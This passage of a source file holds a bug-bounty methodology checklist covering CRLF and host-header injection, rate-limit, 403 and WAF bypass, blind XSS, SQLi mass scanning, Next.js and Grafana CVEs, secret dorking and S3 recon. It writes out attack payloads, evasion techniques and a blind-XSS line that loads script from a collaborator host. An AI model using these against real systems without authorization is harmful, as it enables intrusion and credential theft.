			"Run jsleak -s -l -k on the live list; look for API keys, tokens, hidden endpoints with status codes",
			"Run nuclei -t prsnl/credentials-disclosure-all.yaml (exposures dir) at -c 30; look for regex-matched credentials in responses",
			"Extract with lazyegg --js_urls --domains --ips --leaked_creds --local_storage; look for leaked creds, internal domains, localStorage tokens",
			"Feed gospider JS URLs to jsleaks -s -k; look for JS-only endpoints manual review misses",
			"Grep bundles for AIza[0-9A-Za-z_-]{35} (Google), AKIA[0-9A-Z]{16} (AWS), eyJ jwt headers, /api/ endpoints"
		],
		techniques: ["katana -jc / gau | anew", "httpx -mc 200 liveness", "jsleak -s -l -k", "nuclei credentials-disclosure templates", "lazyegg + EndPointer auto-parser"]
	},
	{
		slug: "origin-ip",
		name: "Origin IP Discovery (WAF bypass)",
		description: "Finding the real origin behind a WAF ('How to Find Origin IP of any Website Behind a WAF' + Sri Lanka SQLi WAF-bypass leg): cert/favicon pivots, historical DNS, SPF chains, then direct-origin testing.",
		checks: [
			"Confirm WAF presence with ping + Wappalyzer + wafw00f; identify CDN (Cloudflare/CloudFront/Akamai) vs direct server IP",
			"Pivot on Shodan/Censys with Ssl.cert.subject.CN:\"<DOMAIN>\" and favicon-hash lookups; look for IPs serving the same cert/favicon that respond with the real site",
			"Query historical IP sources (SecurityTrails, viewdns.info) for pre-WAF A records that still serve the app",
			"Extract SPF TXT records and expand ip4:/ip6:/include: entries; look for origin IPs in the SPF chain",
			"Harvest candidate hosts from VirusTotal/AlienVault (OTX) url_list one-liners and verify with httpx-toolkit -sc -title -server -td; look for IPs whose title matches the target",
			"Map the suspected origin IP in /etc/hosts, load the domain in a browser; look for the site rendering without WAF blocks and confirm TLS with nmap",
			"Test the origin for direct SQLi/XSS (no WAF on origin); look for injectable params the edge WAF was filtering"
		],
		techniques: ["Shodan/Censys Ssl.cert.subject.CN + favicon-hash pivots", "SecurityTrails/viewdns history", "SPF include chain expansion", "OTX url_list / VirusTotal harvest", "shodan search ... 200 --fields ip_str"]
	},
	{
		slug: "crlf-injection",
		name: "CRLF Injection",
		description: "CRLF injection & HTTP response splitting ('Master CRLF Injection'): header injection via params/paths, XSS-protection bypass chains, response splitting, GBK-encoded encodings to dodge WAFs.",
		checks: [
			"curl -I 'https://example.com/%0d%0aSet-Cookie:crlf=injected;' on params reflected into headers; look for the Set-Cookie header in the response",
			"Place /%0d%0aSet-Cookie:coffin=hi; in the URL path; look for the injected header in 3xx responses",
			"Chain %3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C/script%3E; look for X-XSS-Protection:0 + script in the body",
			"Attempt response splitting with ?q=abc%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK...; look for a second response block",
			"Use GBK-encoded CR/LF /%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=coffinxp when plain %0d%0a is blocked",
			"CRLF-to-XSS with GBK angle brackets /%E5%98%8D%E5%98%8A...%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE; look for executable JS",
			"Change ?page=home to ?page=home%0d%0aSet-Cookie:crlf=1 in Repeater; look for new headers or broken layout",
			"Scale with nuclei -t cRlf.yaml over a subfinder subdomain list; look for domains crlfuzz misses"
		],
		techniques: ["%0d%0a / %0a / %00%0d%0a variants", "GBK-encoded CR/LF %E5%98%8D%E5%98%8A", "nuclei cRlf.yaml", "loxs mass-CRLF scanner"]
	},
	{
		slug: "host-header",
		name: "Host Header Injection",
		description: "Host header attacks ('Mastering Host Header Injection'): password-reset poisoning, cache poisoning, routing abuse, header-based SQLi/XSS/SSRF via Host and X-Forwarded-Host.",
		checks: [
			"curl -I -H 'Host: attacker.com' https://target.com; look for generated links, redirects or reset emails pointing at attacker.com",
			"Send X-Forwarded-Host: attacker.com on password-reset and redirect-generating endpoints; look for attacker.com in reset links or Location headers",
			"Try Host variants (prefix, subdomain, port, absolute URL, leading space/tab, blank, duplicate Host headers); look for differing responses or access-control bypass",
			"Fuzz ffuf -u https://target.com -H 'Host: FUZZ' -w hosts.txt; look for response-size/status anomalies per host value",
			"Header-based SQLi X-Forwarded-Host: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z; look for time delays",
			"Header-based XSS X-Forwarded-Host: evil.com\"><img src/onerror=prompt(document.cookie)>; look for reflection into HTML",
			"SSRF via Host with internal hostnames like internal-service.local; look for internal API or metadata responses",
			"Try special chars, encoded values and path traversal (target.com%00.attacker.com, %74%61%72%67%65%74.com, ../../attacker.com); look for parser errors"
		],
		techniques: ["X-Forwarded-Host reset/redirect poisoning", "ffuf Host: FUZZ wordlist", "duplicate Host / absolute URL", "header-based SQLi/XSS payloads"]
	},
	{
		slug: "rate-limit",
		name: "Rate Limit Bypass",
		description: "Rate-limiting evasion techniques ('Mastering Rate Limit Bypass Techniques'): client-IP header rotation, mirror endpoints, method/param/encoding tricks, pacing, proxies, CAPTCHA solvers, OTP resend abuse.",
		checks: [
			"Rotate client-IP headers (X-Forwarded-For, X-Real-IP, X-Client-IP, X-Remote-IP, True-Client-IP, CF-Connecting-IP, Fastly-Client-IP, X-Cluster-Client-IP = 127.0.0.1); look for the counter resetting per value",
			"Try mirror endpoints (/login, /user/login, /api/login, /api/v1/login, /mobile/login, /auth/login, /authenticate, /session/create); look for one with no limit/CAPTCHA/2FA",
			"Switch methods POST -> GET/PUT/DELETE/OPTIONS; look for an uncounted method",
			"Vary/duplicate parameter names (user/pass, uname/pwd, user=admin&user=admin2); look for distinct counting buckets",
			"Encoding tricks (%20, %00, hex %61%64%6d%69%6e, partial ad%6Din, double-encoding, JSON body); look for decoding quirks that evade filters",
			"Rotate User-Agent via Burp Intruder; look for per-UA counting",
			"Pace requests under the window (time.sleep(0.9)); look for never tripping the block",
			"Rotate proxies (proxychains / Python proxies list); look for per-IP counting that proxies defeat",
			"Try CAPTCHA bypass libraries (GoogleRecaptchaBypass / CloudflareBypassForScraping); look for a solvable challenge unlocking unlimited attempts",
			"Target OTP/2FA resend and QR/secret-key endpoints (resend OTP, regenerate code, disable 2FA); look for missing rate limiting on the most sensitive flows"
		],
		techniques: ["X-Forwarded-For/True-Client-IP/CF-Connecting-IP rotation", "mirror endpoint enumeration", "method + param-name switching", "proxychains / IP rotation", "OTP/2FA endpoint targeting"]
	},
	{
		slug: "403-bypass",
		name: "403 Forbidden Bypass",
		description: "Access-control bypass on 403 endpoints (2025 edition + IIS leg): method switching, spoofed routing headers, encoded traversal, path mutations, null bytes, HTTP/1.0 downgrade, JWT tampering, automated verification.",
		checks: [
			"Try alternate HTTP methods (OPTIONS..SEARCH) via curl --path-as-is; look for any non-403 status",
			"Spoof headers (X-Original-URL, X-Rewrite-URL, X-Forwarded-For, X-Custom-IP-Authorization, X-Client-IP, X-Host, Referer); look for 200/redirect responses",
			"URL-encoded, double-encoded and Unicode traversal (%2e%2e%2f, %252f, %c0%af) with --path-as-is; look for 200",
			"Path mutations (trailing slash, ..;/, case variants, trailing dot/semicolon, extension suffixes, junk params/fragments); look for status differences",
			"Null-byte injection (%00) in path and filename; look for truncated-path access",
			"HTTP/1.0 downgrade and http<->https switching; look for weaker enforcement on legacy protocol paths",
			"JWT alg:none / role tampering on protected endpoints; look for privilege escalation to admin",
			"Remove the Host header and IP-spoofing headers; look for the server defaulting to 127.0.0.1/localhost and granting access",
			"Check alternate subdomains/ports and Wayback snapshots of the restricted path; look for public copies or misconfigured twins",
			"Automate with ffuf 403 header+URL payload wordlists, verifying every hit by content length and body (4-ZERO-3 style); look for false positives"
		],
		techniques: ["method switching + --path-as-is", "X-Original-URL/X-Rewrite-URL header spoofing", "4-ZERO-3 wordlists", "ffuf 403 payload automation", "HTTP/1.0 downgrade"]
	},
	{
		slug: "email-field",
		name: "Email Input Field Testing",
		description: "Email input field vulnerability testing ('The Ultimate Guide to Email Input Field Vulnerability Testing'): RFC822 edge cases, XSS/SSRF/CRLF/SQLi/CMDi through email values, user enumeration, homographs, CSV injection.",
		checks: [
			"RFC822 edge cases (quoted local part, address literal, plus addressing, Unicode); look for validation bypass or crashes",
			"XSS payloads in the email field across register/reset; look for reflection in HTML, attributes, JS or outbound emails",
			"SSRF by setting the email domain to Collaborator/requestbin or internal IPs (127.0.0.1, 169.254.169.254); look for outbound callbacks",
			"CRLF sequences (%0d%0a, \\r\\n) in email values; look for injected BCC/CC/Content-Type headers in raw emails or response splitting",
			"SQLi and command-injection payloads in the email field; look for errors, timing differences or OAST callbacks",
			"Open redirect via email-derived URLs (Location headers, next= params); look for redirects to attacker-controlled hosts",
			"User enumeration via registration/reset response differences for known emails; look for differential error messages",
			"Unicode homograph emails (Cyrillic 'a'); look for accepted visually-similar addresses",
			"CSV/log injection (formula payloads, \\n) in email exports and logs; look for formula execution in spreadsheets",
			"Rate-limit reset/registration; look for missing throttling and token brute-forceability"
		],
		techniques: ["RFC822 edge-case battery", "OAST domain as email domain", "CRLF header injection in emails", "unicode homograph emails", "differential user enumeration"]
	},
	{
		slug: "mass-assignment",
		name: "Mass Assignment",
		description: "Mass assignment in registration flows ('Uncovering Invisible Privileges'): injected admin/role/tenant/billing/verification fields, nested and prototype keys, type confusion, NoSQL operators, alternate content-types.",
		checks: [
			"Inject admin flags (isAdmin, admin, ADMIN, is_admin) in all casings and types; look for an elevated role on the account",
			"Role/privilege fields (role, role_id, user_priv, is_superuser, super_user, staff) at registration; look for admin/superuser assignment",
			"Org/tenant fields (org, organization_id, org_slug); look for joining restricted or internal tenants",
			"Nested and dot-notation keys (account.role, profile.role, __proto__) for prototype pollution; look for internal field overwrites",
			"Type-confusion values (admin:\"false\", 0, null, arrays) and NoSQL operators ($ne, $gt); look for truthy coercion or filter bypass",
			"Verification fields (email_verified, verification_expires, status, state); look for accounts activated without email confirmation",
			"Billing fields (plan, subscription_id, is_premium, trial_ends_at); look for free Pro/Enterprise entitlement",
			"OAuth provider fields (provider, provider_id, auth_strategy) in password signup; look for linking to a victim's social identity",
			"Alternate Content-Types (text/plain, application/xml, form-urlencoded, charset/boundary junk) with JSON bodies; look for weaker validation paths",
			"Oversized/repeated fields and combined multi-technique payloads; look for deserialization-path triggers or truncation failures"
		],
		techniques: ["admin/role flag battery", "nested/dot/__proto__ keys", "NoSQL operators $ne/$gt", "alternate Content-Types", "type-confusion values"]
	},
	{
		slug: "punycode-idn",
		name: "Punycode / IDN Homograph Attacks",
		description: "0-click account takeover with Punycode IDN homographs ('The Most Underrated 0-Click Account Takeover'): registering lookalike emails, reset/2FA flows against the victim account.",
		checks: [
			"Register Punycode/IDN homograph variants of a valid email (sent via Burp, not the browser) for each confusable character; look for 'Email already exists' or account-merge responses",
			"Password reset with the Punycode email variant after registering the original; look for the reset link delivered to your Collaborator/Interactsh mailbox",
			"Unicode variants in the email local part (e.g. ṡecurity vs security) across register+reset flows; look for both resolving to the same account",
			"2FA setup on a homograph email then login to the victim's real email; look for acceptance of your own 2FA code on the victim account",
			"xn-- prefixed Punycode domains across registration/login/reset; look for inconsistent normalization between flows",
			"Login endpoint with the Punycode email vs the original; look for validation logic that differs from signup"
		],
		techniques: ["punycode homograph generator (confusable chars)", "register -> reset -> collaborator flow", "2FA setup abuse", "xn-- variant testing"]
	},
	{
		slug: "blind-xss",
		name: "Blind XSS",
		description: "Blind XSS for high bounties ('Mastering Blind XSS' + clipboard PasteJacking): header injection into admin logs, EXIF/HTML upload rendering, hidden params, scaling with bxss pipelines, paste-handler audit.",
		checks: [
			"Inject User-Agent with blind payloads via Burp Match and Replace or a UA switcher; look for OOB callbacks when admins view backend logs",
			"Send Referer/Origin/Cookie/Accept/Host/X-Forwarded-For with blind payloads (script src, svg onload, img onerror); look for dashboard hits from the target's IP",
			"Upload a JPEG whose EXIF Comment is exiftool -Comment='\"><img src=x onerror=alert(1)>' test.jpg; look for execution when a backend panel renders image metadata",
			"Upload HTML/SVG files with blind-XSS payloads; look for callbacks when admin previews open the file",
			"Discover hidden parameters with Arjun (--passive + seclists burp-parameter-names, --rate-limit 10); look for new injectable params",
			"Inject every input on contact/feedback/ticket forms with Blind-XSS-Manager one-click injection; look for stored callbacks firing later",
			"Use an all-in-one HTML payload file with double/triple URL encoding and HTML entities for hardened targets; look for any decode path firing",
			"Scale with the pipeline subfinder -d <domain> | gau | grep '&' | bxss -appendMode -payload '<script src=https://<collab>></script>' -parameters; look for alerts on the blind-XSS dashboard",
			"Grep site JS for 'paste' listeners reading e.clipboardData.getData('text/html') assigned to innerHTML; look for unsanitized clipboard HTML insertion",
			"Test rich-text fields (comment editor, WYSIWYG, admin panel) by pasting attacker-copied HTML; verify CSP blocks inline scripts and paste handlers use textContent/DOMPurify",
			"Header battery: X-Forwarded-For with blind payload (xss.collab), X-Forwarded-Host, Host, plus curl --request-target http://<collaborator>/ URL smuggling — look for OOB callbacks from admin-facing proxies and log dashboards"
		],
		techniques: ["header injection (UA/Referer/XFF/Host)", "XFF/X-Forwarded-Host/Host/--request-target battery", "EXIF Comment uploads", "Arjun hidden-param discovery", "bxss -appendMode pipeline", "clipboard paste-handler audit"]
	},
	{
		slug: "waf-bypass",
		name: "WAF Bypass (SQLMap/Ghauri)",
		description: "WAF bypass masterclass with sqlmap + proxychains + tamper scripts ('The Ultimate Guide to WAF Bypass Using SQLMap, Proxychains & Tamper Scripts' + 'Mastering SQLMap and Ghauri'): vendor-matched tampers, junk stuffing, body-size limits, origin bypass.",
		checks: [
			"proxychains sqlmap -u <url> --dbs --batch -p id --random-agent --tamper=between,space2comment --dbms mysql --tech=B --no-cast --flush-session --threads 10; look for dumps past the 403 Block page",
			"Verify proxychains rotation with repeated `proxychains curl http://ipinfo.io/ip`; look for rotating exit IPs (residential proxies)",
			"Confirm initial autodetect with Ghauri on MySQL targets; look for boolean-based SQLi flags, then confirm manually to discard false positives",
			"Map exact filtered payloads with HackBar XSS payloads against Cloudflare/ModSecurity; look for Block pages/403s per param",
			"Vendor-matched tamper combos (between+randomcase+space2comment, space2comment+space2morehash, charencode+randomcase+space2comment; max 3 at a time); look for blocked payloads now passing",
			"--ignore-code=401,403,500 so scans continue past WAF blocks; look for injections reachable behind blocked codes",
			"--hex and --no-cast when data retrieval fails or encoding breaks; look for clean dumps despite filters",
			"Ghauri --confirm, --prefix \"')/**/\", --suffix \"--+\", --dbms, --tech=T, --time-sec, --delay; look for human-like blind/time-based pacing",
			"Junk-data body stuffing (large junk= param) against Fortinet/FortiWeb-class WAFs; look for injections passing past the body-inspection limit",
			"Test WAF body-size limits per provider (Cloudflare 128KB, AWS WAF 8-64KB, Akamai 8-128KB, Azure 128KB); look for SQLi bypassing truncated inspection",
			"OOB/DNS exfiltration with --dns-domain and --technique=O; look for DNS queries confirming blind SQLi when in-band is unavailable"
		],
		techniques: ["proxychains sqlmap rotation", "vendor-matched tamper combos (max 3)", "junk-data stuffing / body-size limits", "--ignore-code / --hex / --no-cast", "OOB DNS exfiltration"]
	},
	{
		slug: "framework-cves",
		name: "Framework CVE Hunting",
		description: "High-profile framework/vendor CVEs from the article set: Next.js middleware auth bypass CVE-2025-29927 and Grafana path traversal CVE-2025-4123 (XSS / open redirect / SSRF chains).",
		checks: [
			"Next.js middleware bypass with header x-middleware-subrequest: middleware:middleware:middleware:middleware on protected endpoints; look for 200 instead of a 307 redirect to /login",
			"Fingerprint Next.js via /_next/static/manifest.json and /_next/static/chunks/ when Wappalyzer hides the version; look for versions below 15.2.3/14.2.25/13.5.9/12.3.5",
			"Detect middleware via the x-middleware-rewrite response header on any Next.js host; look for CVE-2025-29927 nuclei-template candidates",
			"Cache-poisoning variant with X-Middleware-Prefetch manipulation (coffinxp/nuclei-templates nextjs-middleware-cache.yaml); look for cached protected pages served unauthenticated",
			"Mass-hunt with nuclei CVE-2025-29927.yaml over Shodan domain/IP lists after uro cleanup; look for 200s on protected admin/dashboard paths",
			"Grafana path normalization with encoded traversals (..%2F, %5C, double-encoded %252f%255C) in /public/ and /a/ plugin routes; look for external domains or 127.0.0.1 accepted as routing targets",
			"Grafana open redirect via /public/..%2F%5Coast.pro%2F%3f%2F..%2F..; look for a silent redirect to an external OOB domain",
			"Forged plugin.json whose module points to an attacker server; look for remote JS execution in the Grafana origin (XSS to ATO), and client-side SSRF via 127.0.0.1 / cloud metadata IPs",
			"Find exposed Grafana via Shodan/FOFA (title:\"Grafana\", icon_hash=\"2123863676\", body=\"Grafana v11.6.0\"); look for versions older than 11.0.1 and run the CVE-2025-4123 template"
		],
		techniques: ["x-middleware-subrequest + x-middleware-rewrite probes", "coffinxp nuclei-templates (nextjs-middleware-cache.yaml)", "Grafana icon_hash 2123863676 / title dorks", "CVE-2025-29927 / CVE-2025-4123 nuclei templates"]
	},
	{
		slug: "github-recon",
		name: "GitHub & Secret Dorking",
		description: "GitHub recon for high-impact leaks ('GitHub Recon' + 'Finding & Exploiting Exposed Google API Keys'): dorks, org-scoped searches, TruffleHog/gitGraber, /.git exposure, KeyHacks validation, Google API key abuse.",
		checks: [
			"Dork `\"example.com\" password` and JSON key-value format; look for credentials tied to the target domain",
			"org:-scoped dorks with OR-combined secret keywords (api_key, secret, private_key, AWS, DB); look for matches in org repos",
			"filename:/extension:/path: filters (filename:.env, extension:json, path:/config, path:/.ssh, path:/.git, path:**/.env); look for pushed env/config/secret files",
			"Run TruffleHog with --results=verified,unknown; look for verified secrets with real credentials",
			"gitGraber for org and strict-domain queries; look for keyword matches with URLs, timestamps and JSON previews",
			"Check /.git/ exposure with httpx-toolkit -path /.git/ -mc 200 and DotGit; look for 'Index of' listings or 200s; git-dumper/GitTools on 403-but-present dirs",
			"Recover deleted files and history with git restore . / git checkout . on dumped repos; look for historical secrets",
			"Validate found keys with KeyHacks; look for live keys before reporting",
			"Dork `\"GEMINI_API_KEY\"` and /AIza[0-9A-Za-z_-]{35}/ plus path:/.env, path:/*.js, org:/domain filters; look for leaked Gemini/Google keys",
			"Validate Google keys against https://generativelanguage.googleapis.com/v1beta/models?key=KEY; look for a 200 model list vs API_KEY_INVALID errors; test File API, referer-restricted keys, corpora persistence and generation endpoints (gemini-2.5-flash, imagen, veo)"
		],
		techniques: ["org: + filename/extension/path dorks", "TruffleHog / gitGraber", "git-dumper + git history recovery", "KeyHacks validation", "Google API key abuse (Gemini/File/corpora/veo)"]
	},
	{
		slug: "iis-fuzzing",
		name: "Microsoft IIS Fuzzing",
		description: "Hacking Microsoft IIS from recon to advanced fuzzing ('Hacking Microsoft IIS'): 8.3 shortnames, Trace.axd, ASP.NET auth bypasses, WebDAV, ViewState deserialization, 4-ZERO-3.",
		checks: [
			"Detect IIS with curl -I headers and nmap -p 80,443 -sV -sC; look for Server: Microsoft-IIS/x.y and X-Powered-By: ASP.NET",
			"Enumerate shortnames with shortscan http://target.com/ -F or Burp IIS Short Name Scanner; look for tilde (8.3) names like ADMINI~1, BACKUP~1",
			"ffuf with -e .json,.js,.svc,.asmx,.aspx,.ashx,.zip,.7z,.bak,.old,.rar on IIS wordlists plus prefix/suffix/hyphen/underscore/version variations; look for backups, configs, archives",
			"Resolve shortnames by fuzzing KNOWNPREFIXFUZZ with --fc 403; look for the full name of discovered 8.3 entries",
			"Visit /Trace.axd; look for request logs leaking paths, params and cookies",
			"ASP.NET auth bypasses: ASP.NET_SessionId injection, cookieless session /(S(ABC123XYZ))/AdminPanel.aspx, Request.Path manipulation /Admin/ManageUsers.aspx/Login.aspx; look for 403-to-200 or 200 instead of 302 login redirect",
			"WebDAV with curl -X OPTIONS -i then PUT/DELETE/MOVE/PROPFIND; look for DAV: 1,2 and dangerous Allow methods",
			"ViewState: decode __VIEWSTATE; if the MAC is weak generate ysoserial.net ViewState payloads; look for deserialization/RCE",
			"Verify 403 bypass hits with 4-ZERO-3 by status/body/length, not fallback redirects"
		],
		techniques: ["shortscan (8.3 shortname enumeration)", "cookieless session + Request.Path tricks", "Trace.axd / WebDAV", "ysoserial.net ViewState", "4-ZERO-3"]
	},
	{
		slug: "nuclei-dast",
		name: "Nuclei Templates & DAST",
		description: "Private nuclei template collection + LostFuzzer passive DAST ('Ultimate Nuclei Templates' + 'LostFuzzer'): openRedirect, wp-setup-config, .git, CORS, blind SSRF, errorsqli, Swagger XSS, plus gau|uro|httpx passive pipelines.",
		checks: [
			"openRedirect nuclei template with domain-valued query params; look for 3xx to attacker-controlled hosts",
			"wp-setup-config template on wp-admin/setup-config.php; look for setup pages that leak credentials",
			"Probe /.git/ and /.git/config; look for 'Index of' listings and '[core]' config responses",
			"CORS: curl -H 'Origin: http://example.com' -I <url>; look for reflected access-control-allow-origin with allow-credentials",
			"nuclei -t blind-ssrf.yaml -dast for OOB callbacks, then /etc/passwd via the Response SSRF template",
			"nuclei -t errorsqli.yaml -dast; look for database error strings in responses",
			"Swagger UI XSS by appending ?configUrlUrl= with xsscookie.json/login.json payloads; look for cookie-stealing popups or fake login forms",
			"CRLF: curl -I 'https://domain.com/%0aSet-Cookie:coffin=hi;'; look for the injected header",
			"Passive pipeline: gau in parallel per subdomain -> uro dedup -> httpx-toolkit liveness -> nuclei over filtered live URLs; look for hits recorded in nuclei_results.txt"
		],
		techniques: ["nuclei -t <template> -dast", "coffinxp templates (openRedirect, wp-setup-config, blind-ssrf, errorsqli)", "gau | uro | httpx pipeline", "filtered_urls.txt artifacts"]
	},
	{
		slug: "s3-recon",
		name: "S3 Bucket Recon",
		description: "Finding exposed AWS buckets ('S3 Bucket Recon: Finding Exposed AWS Buckets Like a Pro'): anonymous listing, JS bucket URLs, name permutations (lazys3), org enumeration (s3scanner), write-access checks.",
		checks: [
			"aws s3 ls s3://[bucketname] --no-sign-request; look for anonymous file listings",
			"katana -jc and grep for s3.amazonaws.com in JS files; look for bucket endpoints then test their listings",
			"ruby lazys3.rb <COMPANY> for bucket-name permutations; look for existing buckets instead of NoSuchBucket errors",
			"cewl -d 3 feeding s3scanner -enumerate with org wordlists; look for AllUsers READ/WRITE/FULL grants",
			"Dork org:target \"aws_secret_key\" in GitHub orgs; look for leaked keys and bucket names",
			"Recursive aws s3 ls grepping .env/.pem/.key/.sql/.db; look for credentials, backups, configs",
			"aws s3 cp file.txt s3://[bucketname] --no-sign-request; look for anonymous uploads (Full Control ACL)",
			"httpx-toolkit -td | grep 'Amazon S3'; look for S3-backed subdomains then test their buckets"
		],
		techniques: ["aws s3 ls --no-sign-request", "lazys3 permutations", "s3scanner -enumerate", "JS bucket URL grep (katana -jc)", "anonymous write tests"]
	},
	{
		slug: "swagger-api",
		name: "Swagger UI & API Docs Discovery",
		description: "The dark side of Swagger UI ('The Dark Side of Swagger UI'): exposed API docs, DOM XSS via configUrlUrl, open redirect, fake login phishing, outdated versions, nuclei Swagger templates.",
		checks: [
			"Dork intext:\"Swagger UI\" intitle:\"Swagger UI\" site:Target.com; look for exposed API documentation pages",
			"Probe common paths with echo \"example.com\" | httpx -path /docs,/swagger,/api-docs,/swagger-ui,/swagger-ui.html; look for 200s",
			"DOM XSS with ?configUrlUrl= loading xsstest.json/xsscookie.json; look for script execution or cookie/localStorage exfiltration",
			"Open redirect with ?configUrlUrl= loading rlogin.json; look for redirects to attacker hosts",
			"HTML injection by loading login.json as configUrlUrl; look for rendered fake login forms (phishing)",
			"Jamff Pro with the classicapi doc configUrlUrl data: payload and alert(localStorage.getItem('authToken')); look for authToken exposure",
			"GitHub dork \"/swagger-ui-dist\" : \"3.[1-3]/\" path:*/package.json; look for Swagger 3.1-3.3 versions",
			"nuclei -t Swagger.yaml on discovered domains/IPs; look for swagger-specific XSS/redirect matches"
		],
		techniques: ["/swagger-ui.html,/api-docs,/v2/api-docs,/v3/api-docs probes", "?configUrlUrl= XSS/redirect payloads", "Jamff Pro classicapi", "nuclei Swagger.yaml"]
	},
	{
		slug: "wayback-mining",
		name: "Wayback Machine Deep Mining",
		description: "Unlock the full potential of the Wayback Machine ('Unlock the Full Potential of the Wayback Machine'): CDX queries, sensitive extensions, deleted-file recovery, robots.txt snapshots, archived PDFs.",
		checks: [
			"CDX API url=*.domain/* with collapse=urlkey, fl=original; look for sensitive URLs (api, admin, upload, .env, .git)",
			"Filter archived URLs for sensitive extensions (.db, .env, .git, .zip, .sql, .bak, .pem, .key, .xls, .pdf); look for retrievable secrets",
			"Check 404/deleted URLs against Wayback snapshots via the timeline; look for recoverable deleted files still served",
			"Historical robots.txt snapshots for hidden endpoints; look for disallowed admin/internal paths",
			"Archived PDFs grepped for confidential keywords (confidential, salary, SSN, bank statement, passport); look for leaked documents",
			"Wayback browser view (web/*/domain/*) with extension filters; look for archive-only endpoints no longer live"
		],
		techniques: ["CDX collapse=urlkey fl=original", "extension filtering (.db .env .zip .sql .bak .pem .key .xls)", "robots.txt snapshot mining", "web/*/domain/* archive filters"]
	},
	{
		slug: "fuzz-pipeline",
		name: "Automated Fuzzing & Recon Pipeline",
		description: "Practical fuzzing workflows merged from 'A Practical Workflow for Fuzzing and Scanning', 'FFUF Mastery' and 'My 5-Minute Workflow': chaos->httpx->naabu->nmap->nuclei->ffuf, ffuf modes, bookmarklets, passive scripts.",
		checks: [
			"chaos -d target -o file before active scanning; look for forgotten/stale assets",
			"httpx -ip and dedupe IPs with sed/sort -u; filter CDN/WAF IPs (Cloudflare/Akamai/Fastly); verify origin via httpx -title match",
			"naabu -top-ports 100 -verify then nmap service/version + NSE on unique IPs; look for outdated software on non-standard ports",
			"nmap-parse-output HTML report; look for host exposure summaries and version anomalies",
			"nuclei -tags cve against naabu output (all ports); look for CVEs/misconfigs on non-standard ports",
			"ffuf backup wordlists across SUB:FILE; look for .bak/.zip/.env paths returning 200",
			"Analyze ffuf response sizes and word counts, not just status codes; filter same-size 200 custom error pages with -fs; investigate every 403 as a bypass candidate",
			"ffuf modes: -fc 404,500 directory fuzz; -e .php,.asp,.bak,.db,.json,.yaml extension fuzz; -H 'Host: FUZZ.example.com' vhost fuzz; clusterbomb login fuzz; -X POST -d 'FUZZ=value' API fuzz; -X PUT unauthorized writes",
			"Route ffuf through Burp (-x http://127.0.0.1:8080) with -rate 50 -t 50; add -recursion -recursion-depth 3; fuzz custom headers -H 'X-Custom-Header: FUZZ'",
			"5-min leg: Shodan facet bookmarklet -> nuclei -tags <cve-tags> -bs 50 -c 50 -es info; unhide bookmarklet for hidden client-side elements; lost-uncover + alienvault.sh + wayback.sh + virustotal.sh + urlscan.py --mode subdomains; gf xss|sqli|idor|ssrf|redirect | uro triage",
			"ffuf -request <file> -request-proto https — replay a raw captured request (Burp copy-paste into a file, FUZZ on the target line) for LFI/XSS POST params or header-heavy endpoints"
		],
		techniques: ["chaos -> httpx -ip -> naabu -> nmap -> nuclei -tags cve -> ffuf", "ffuf -e extensions / -fs filters / vhost / clusterbomb / recursion", "ffuf -request raw replay", "bookmarklets (unhide, lost-uncover) + lost/ scripts", "gf | uro URL triage"]
	},
	{
		slug: "sqli-recon",
		name: "SQLi Recon & Mass Scanning",
		description: "Mastering SQL injection recon ('Mastering SQL Injection Recon' + Sri Lanka electricity board case): passive URL harvest, gf sqli triage, mass ghauri/sqlmap, time-based payloads per DBMS, header-based injection, dorking.",
		checks: [
			"subfinder -all | httpx-toolkit and grep for asp/php/jsp/aspx extensions; look for dynamic legacy hosts that are SQLi-prone",
			"gau/katana (waybackarchive, commoncrawl, alienvault) filtered by dynamic extension and a '=' sign; look for parameterized URLs",
			"gf sqli then uro dedup; look for URLs matching id=, cat=, page= patterns",
			"Mass scan with ghauri -m and sqlmap -m (batch, random-agent, tamper, threads); look for confirmed injections and --dbs databases",
			"Time-based blind payloads per DBMS (SLEEP(10), pg_sleep(10), WAITFOR DELAY, DBMS_PIPE.RECEIVE_MESSAGE) with time curl; look for ~10s delays",
			"Header-based injection via User-Agent, X-Forwarded-For and Referer with XOR sleep payloads; look for delayed responses",
			"XOR polyglot time-based payloads appended to GET params; look for ~10s delays that bypass keyword/quote filters",
			"Google dorking per-DBMS error fingerprints (MySQL 'You have an error in your SQL syntax', Oracle ORA-00933, MSSQL 80040e14, PostgreSQL pg_query); look for error-based disclosure pages",
			"Dorks for dumps (ext:sql|ext:db|ext:bak intitle:\"index of\" \"db.sql\"); look for downloadable dump.sql/database.sql files",
			"Find the origin IP (Shodan Ssl.cert.subject.CN:\"<DOMAIN>\" 200 --fields ip_str) and re-run SQLi against it; look for injections the WAF blocked",
			"POST-param injection: single quote into numeric params (e.g. iMainOfficeID); look for SQL errors, then replay with ghari -r request.txt; dirsearch backups including vim-swap for .env/.git"
		],
		techniques: ["waybackurls | gf sqli | uro", "gawk host-seen dedupe", "ghauri -m / sqlmap -m mass scan", "time-based payloads per DBMS", "XOR polyglot + header injection", "per-DBMS error dorks"]
	},
	{
		slug: "open-redirect",
		name: "Open Redirect Deep Dive",
		description: "Hunting high-paying open redirect bugs ('From Zero to Hero: Hunting High-Paying Open Redirect Bugs'): param battery, bypass encodings, URL collection pipelines, mass scanning with qsreplace/httpx, chained to XSS/OAuth.",
		checks: [
			"Test redirect params with protocol-relative, backslash, scheme-without-slash, %40, %2e, %23, %E3%80%82 and %0d variants; look for Location headers to external hosts",
			"Encoded/alternate redirects (URL-encoded full URL, path-based, data URI, javascript: scheme); look for 3xx redirects to attacker content",
			"Case/obfuscation variants (//GOOGLE.com/, //google.com/#/, //google.com/;&/, decimal/hex/IPv6 IPs, non-standard ports, Unicode path chars); look for exact-string filter bypasses",
			"Collect URLs with gau/katana/urlfinder/hakrawler merged via uro; look for a deduplicated corpus including archived endpoints",
			"Filter redirect params with grep -Pi alternation or gf redirect; look for next=, returnUrl=, redirect_uri=, dest= in final.txt",
			"Mass-scan qsreplace 'https://evil.com' | httpx-toolkit -silent -fr -mr 'evil.com'; look for effective redirects to evil.com",
